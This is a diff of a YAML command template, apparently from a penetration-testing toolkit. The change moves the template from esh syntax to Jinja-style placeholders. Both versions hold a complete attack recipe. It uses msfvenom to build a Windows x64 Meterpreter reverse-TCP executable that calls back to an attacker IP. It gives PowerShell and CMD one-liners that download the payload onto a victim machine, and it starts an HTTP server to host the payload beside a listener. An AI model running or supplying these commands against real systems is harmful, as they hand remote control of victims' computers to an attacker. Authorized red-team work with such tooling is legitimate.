@@ -1,21 +1,24 @@
----
 metadata:
-  filename: "deliver-windows-x64-revshell-msfvenom-meterpreter-nonstaged-exe.yaml"
-  tags: ["shell", "windows"]
-  created: "2025-03-29"
-  author: "Unknown"
-
-content: |
-  mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
-  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<%=$(esh variables/attacker_ip)%> LPORT=<%=$(esh variables/shell_port)%> -f exe > packstation/outbound/revshell.exe ; \
-  echo '================================================================'; \
-  echo '                      ------Listener------                      '; \
-  echo 'Start listener: <% echo $(esh scripts/listener-msf-multi-handler-windows-x64-meterpreter-nonstaged) %>'; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver only: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/revshell.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\revshell.exe'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo 'Deliver only: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/revshell.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\revshell.exe'; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: deliver-windows-x64-revshell-msfvenom-meterpreter-nonstaged-exe.yaml
+  tags:
+  - shell
+  - windows
+  created: '2025-03-29'
+  author: Unknown
+content: "mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please\
+  \ wait...'; \\\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={{ attacker_ip\
+  \ }} LPORT={{ shell_port }} -f exe > packstation/outbound/revshell.exe ; \\\necho\
+  \ '================================================================'; \\\necho '\
+  \                      ------Listener------                      '; \\\necho 'Start\
+  \ listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-meterpreter-nonstaged.yaml')\
+  \ }}'; \\\necho '================================================================';\
+  \ \\\necho '                      -----PowerShell-----                      '; \\\
+  \necho 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/revshell.exe -Outfile {{ delivery_path_windows }}\\revshell.exe'; \\\necho\
+  \ '================================================================'; \\\necho '\
+  \                         -----CMD-----                          '; \\\necho 'Deliver\
+  \ only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/revshell.exe -Outfile {{ delivery_path_windows }}\\revshell.exe'; \\\necho\
+  \ '================================================================'; \\\n python\
+  \ {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port\
+  \ }} -d packstation/outbound\n"
